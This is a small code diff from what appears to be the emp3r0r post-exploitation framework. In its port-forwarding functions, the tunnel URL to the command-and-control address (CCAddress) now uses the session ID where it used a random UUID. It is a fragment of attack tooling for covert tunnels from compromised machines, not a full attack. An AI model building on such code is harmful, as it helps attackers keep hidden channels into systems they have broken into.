@@ -10,7 +10,6 @@ import (
 	"sync"
 	"time"
 
-	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/posener/h2conn"
@@ -63,7 +62,7 @@ func PortFwd(addr, sessionID string, reverse bool) (err error) {
 	var (
 		session PortFwdSession
 
-		url = CCAddress + tun.ProxyAPI + "/" + uuid.NewString()
+		url = CCAddress + tun.ProxyAPI + "/" + sessionID
 
 		// connection
 		conn   *h2conn.Conn
@@ -120,7 +119,7 @@ func PortFwd(addr, sessionID string, reverse bool) (err error) {
 func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 	port, sessionID string) {
 	var (
-		url = CCAddress + tun.ProxyAPI + "/" + uuid.NewString()
+		url = CCAddress + tun.ProxyAPI + "/" + sessionID
 		err error
 	)
 
